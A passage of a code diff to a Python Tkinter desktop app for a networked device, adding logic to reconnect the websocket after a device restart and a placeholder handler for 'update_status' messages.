+        self.root.after(3000, self._try_reconnect_after_restart)
+
+    def _try_reconnect_after_restart(self):
+        if not self.dev:
+            return
+        self.dev.close_ws()
+        while not self.dev.msg_queue.empty():
+            try:
+                self.dev.msg_queue.get_nowait()
+            except queue.Empty:
+                break
+        if self.dev.loop and not self.dev.loop.is_closed():
+            try:
+                self.dev.loop.call_soon_threadsafe(self.dev.loop.stop)
+            except Exception:
+                pass
+        self.dev.connect_async()
+        self._status("Reconnecting...", C_ORANGE)
+        threading.Thread(target=self._wait_conn, daemon=True).start()
 
     # Log management
     def _on_view_logs(self):
@@ -1602,6 +2197,8 @@ class App:
                     elif t == "audio_list":
                         recs = msg["data"].get("recordings", [])
                         self.root.after(0, lambda r=recs: self._refresh_alist(r))
+                    elif t == "update_status":
+                        pass
             except queue.Empty:
                 pass
 
